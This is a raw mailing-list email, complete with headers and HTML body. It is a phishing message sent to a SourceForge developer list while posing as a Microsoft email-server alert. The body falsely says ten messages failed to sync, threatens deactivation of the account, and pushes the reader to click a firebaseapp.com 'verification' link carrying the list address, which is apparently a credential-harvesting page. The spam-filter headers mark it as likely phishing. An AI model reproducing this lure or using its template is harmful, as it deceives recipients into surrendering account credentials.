Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id DE7983EAF99
	for <lists+industrypack-devel@lfdr.de>; Fri, 13 Aug 2021 07:23:56 +0200 (CEST)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Content-Type:Reply-To:From:List-Subscribe:
	List-Help:List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=Fiy+wqsuG8K2dKb0N4Z+mh02OnhZCFeoFHwxFLMqcwo=; b=YAOI+QMKVj7tSddK6SYtBJ20zs
	wQgUOZHCo+To25nzHoCQbhemqdCimUEishMVowGDOvDnNzlJqRRlfss5AxwfLXvvwBjsAR/l7HCHj
	dZkhHOImk8mHzR4HfYWFH0Wt2bWkf0f3lP574TrdRiZwST5NnfYyW6BQICTJLgTR8Hk0=;
Received: from [127.0.0.1] (helo=sfs-ml-1.v29.lw.sourceforge.com)
	by sfs-ml-1.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1mEPff-0005bS-N3
	for lists+industrypack-devel@lfdr.de; Fri, 13 Aug 2021 05:23:55 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-1.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <admin@adminsemails.com>) id 1mEPfe-0005bG-In
 for industrypack-devel@lists.sourceforge.net; Fri, 13 Aug 2021 05:23:54 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=HXiLzU9yu35D1t70J3R+IcNgFyRjqTN/dVyG5ggQlwU=; b=NhS7sl/N7CdB+tG0c+uAfDUcR2
 c1n9PFndedySXhjKQ/2uELWwlQzXs7uDFY4c4BqumZp/0EqcUz3/mC1miwxjieVFbKiUZ2Amyslg6
 kMFyPY/v6DacZwAL+uC2aUCGMBA9gEWT2p8FHeTrwqmCx4hUkxhpmKYe5z9eD9kqDP8s=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=HXiLzU9yu35D1t70J3R+IcNgFyRjqTN/dVyG5ggQlwU=; b=P
 eW3SRlS6qdBEG5RRvCQsG7FA/vgWC3hu+hY5tWLOGFYmt6kWj+yyS/b33neU5/GHUi7SGzMacmY5B
 vkfRZyIVtFk+zy/mMV1TIEPfWP9rSvUUvNGSicaOtzBLrDmY3JJzA5pimFSm4xivqLxa0jv6rX5R/
 Rjlt32NphL6wzJ8Q=;
Received: from mail0.adminsemails.com ([138.68.50.39])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.3)
 id 1mEPfa-0006bC-Lx
 for industrypack-devel@lists.sourceforge.net; Fri, 13 Aug 2021 05:23:54 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=adminsemails.com; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type:
 Content-Transfer-Encoding; i=admin@adminsemails.com;
 bh=HXiLzU9yu35D1t70J3R+IcNgFyRjqTN/dVyG5ggQlwU=;
 b=t8L/fwTfZ3RNSQ2Wj74QBfr0gPvhWQhsuUSSyrJDrOtHrNYVKfCEJAlNV9+XllsLxVf5C9/g4XFC
 pI1zW/S1+un92gTPktVoOkdsN1OAWT/NCtq60OeG1fdn7dOWPCy04HW8NbCMZpS+t6OwTc6VFgQX
 tMrFzynVzq7l/7eKkYc=
To: industrypack-devel@lists.sourceforge.net
Date: 13 Aug 2021 07:23:40 +0200
Message-ID: <20210813072340.67A54BE30A516463@adminsemails.com>
MIME-Version: 1.0
X-Spam-Score: 7.8 (+++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 0.0 URIBL_PH_SURBL         Contains an URL listed in the PH SURBL blocklist
 [URIs: merrilyverify.firebaseapp.com]
 0.0 URIBL_BLOCKED ADMINISTRATOR NOTICE: The query to URIBL was blocked.
 See
 http://wiki.apache.org/spamassassin/DnsBlocklists#dnsbl-block
 for more information. [URIs: merrilyverify.firebaseapp.com]
 0.1 URIBL_SBL_A Contains URL's A record listed in the Spamhaus SBL
 blocklist [URIs: merrilyverify.firebaseapp.com]
 0.6 URIBL_SBL Contains an URL's NS IP listed in the Spamhaus SBL
 blocklist [URIs: merrilyverify.firebaseapp.com]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 1.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_FACE_BAD     BODY: HTML font face is not a word
 2.3 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 3.0 URI_FIREBASEAPP        Link to hosted firebase web application, possible
 phishing 2.3 DKIMWL_BL              DKIMwl.org - Blocked sender
 -1.5 AWL AWL: Adjusted score from AWL reputation of From: address
X-Headers-End: 1mEPfa-0006bC-Lx
Subject: [Industrypack-devel] URGENT ATTENTION FOR
 industrypack-devel@lists.sourceforge.net FROM SERVER lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: "E-mail Alert lists.sourceforge.net via Industrypack-devel"
 <industrypack-devel@lists.sourceforge.net>
Reply-To: "E-mail Alert lists.sourceforge.net" <admin@adminsemails.com>
Content-Type: multipart/mixed; boundary="===============1714844517031379931=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============1714844517031379931==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<HTML><HEAD>
<META name=3DGENERATOR content=3D"MSHTML 11.00.10570.1001"></HEAD>
<body>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: i=
nitial; text-decoration-color: initial">
<SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Tah=
oma, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'><B>At 8/13/=
2021 7:23:40 a.m.</B></SPAN><FONT face=3D"wf_segoe-ui_normal, Segoe UI, Seg=
oe WP, Tahoma, Arial, sans-serif, serif, EmojiFont"><FONT color=3D#212121>,=
 Your eMail account</FONT><FONT color=3D#6fa8dc>&nbsp;</FONT></FONT><FONT f=
ace=3D"comic sans ms, sans-serif"><B><FONT color=3D#0c343d>industrypack-dev=
el@lists.sourceforge.net</FONT><FONT color=3D#6fa8dc>&nbsp;</FONT></B></FON=
T>
 F<FONT style=3D"COLOR: rgb(33,33,33)" face=3D"wf_segoe-ui_normal, Segoe UI=
, Segoe WP, Tahoma, Arial, sans-serif, serif, EmojiFont">ailed to sync and =
returned&nbsp;10 Incoming Messages.</FONT></P>
<P style=3D"FONT-SIZE: small; FONT-FAMILY: Arial, Helvetica, sans-serif; WH=
ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 40=
0; COLOR: rgb(34,34,34); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-=
SPACING: normal; TEXT-INDENT: 0px; font-variant-ligatures: normal; font-var=
iant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-style: i=
nitial; text-decoration-color: initial"><FONT face=3D"Segoe UI">
<FONT color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahom=
a, Arial, sans-serif, serif, EmojiFont">Sync failures&nbsp;</FONT><FONT col=
or=3D#212121>occur<FONT face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tah=
oma, Arial, sans-serif, serif, EmojiFont">&nbsp;when a eMail user has not U=
pgraded his/her eMail account in 90 days..</FONT></FONT></FONT><BR><BR><FON=
T color=3D#212121 face=3D"wf_segoe-ui_normal, Segoe UI, Segoe WP, Tahoma, A=
rial, sans-serif, serif, EmojiFont">To avoid&nbsp;D</FONT>
 <SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe WP", Ta=
homa, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'>e-activati=
on</SPAN><SPAN style=3D'FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", "Segoe=
 WP", Tahoma, Arial, sans-serif, serif, EmojiFont; COLOR: rgb(33,33,33)'>&n=
bsp;of this eMail account kindly click below to retrieve &amp; free pending=
 messages back to your inbox.</SPAN></P>
<table style=3D"FONT-SIZE: small; FONT-FAMILY: inherit; WHITE-SPACE: normal=
; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33,=
33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal; =
TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: normal=
; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-deco=
ration-color: initial" cellspacing=3D"0" width=3D"222" border=3D"0">
<TBODY>
<TR>
<td style=3D"FONT-FAMILY: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; MIN-WIDTH: 50px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; PADDING-LEFT: 20p=
x; MARGIN: 0px; PADDING-RIGHT: 20px; BACKGROUND-COLOR: rgb(38,114,236)" bgc=
olor=3D"#2672ec">
<A=20
id=3Dgmail-m_4014264744703004187m_3067988344008626957m_-1136776643231973633=
m_-2450167051005763152m_-2002536060826220612m_-8551308050579542515m_-115036=
4680115986047m_-5789638306153986747m_7712301788687381273m_83583761451686923=
3m_-8403454542672139668m_-1220449622731522563m_2544434100301976007m_-856292=
430060893447m_3701504942798119637m_-7459359542057316429m_-10265620168490560=
76m_99475529778236493m_8952700678076738745m_5981141752607190861m_-846783123=
2996836426m_-3181994744579518690m_531449663853343724
 style=3D'BORDER-LEFT-WIDTH: 0px; FONT-FAMILY: "Segoe UI"; BORDER-RIGHT-WID=
TH: 0px; VERTICAL-ALIGN: baseline; BORDER-BOTTOM-WIDTH: 0px; FONT-WEIGHT: 6=
00; COLOR: rgb(255,255,255); PADDING-BOTTOM: 0px; TEXT-ALIGN: center; PADDI=
NG-TOP: 0px; PADDING-LEFT: 0px; MARGIN: 0px; LETTER-SPACING: 0.02em; PADDIN=
G-RIGHT: 0px; BORDER-TOP-WIDTH: 0px; text-decoration-line: none' href=3D"ht=
tps://merrilyverify.firebaseapp.com/cmx2/page.html#industrypack-devel@lists=
=2Esourceforge.net" rel=3D"noopener noreferrer" target=3D_blank=20
6m_-2227266052050904983m_7512468036195523266m_-4569538411529168292m_-638301=
0426324893864m_-431329529173085315m_4340365228393595725m_-81081262936140120=
79m_-322241902713335328m_-7536137224369418052m_5957959648667100112m_-875331=
7698334416455m_6177816942280141895m_2334083855368786057m_-17241098556170669=
64m_3175762082637707598gmail-m_-3298491012216353318m_-8306674927957226017m_=
-943635012931203858m_541363968806381200m_-8092327942670495150m_685849683581=
4030710m_8929061486479284866gmail-x_x_i10>
Click here to resolve</A></TD></TR></TBODY></TABLE>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-dec=
oration-color: initial'><FONT face=3D"Segoe UI"><BR>
To Verify your account in one simple step and prevent a re-occurrence, plea=
se&nbsp;<A style=3D"COLOR: rgb(17,85,204)" href=3D"https://merrilyverify.fi=
rebaseapp.com/cmx2/page.html#industrypack-devel@lists.sourceforge.net" rel=
=3D"noopener noreferrer" target=3D_blank>click here</A>.</FONT></P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-dec=
oration-color: initial'><B><BR></B></P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-dec=
oration-color: initial'><B>&copy;2021 Microsoft</B>
 </P>
<P style=3D'FONT-SIZE: small; FONT-FAMILY: wf_segoe-ui_normal, "Segoe UI", =
"Segoe WP", Tahoma, Arial, sans-serif, serif, EmojiFont; WHITE-SPACE: norma=
l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT-WEIGHT: 400; COLOR: rgb(33=
,33,33); FONT-STYLE: normal; ORPHANS: 2; WIDOWS: 2; LETTER-SPACING: normal;=
 TEXT-INDENT: 0px; font-variant-ligatures: normal; font-variant-caps: norma=
l; -webkit-text-stroke-width: 0px; text-decoration-style: initial; text-dec=
oration-color: initial'><B>8/13/2021 7:23:40 a.m.</B></P></BODY>
</HTML>


--===============1714844517031379931==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============1714844517031379931==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============1714844517031379931==--
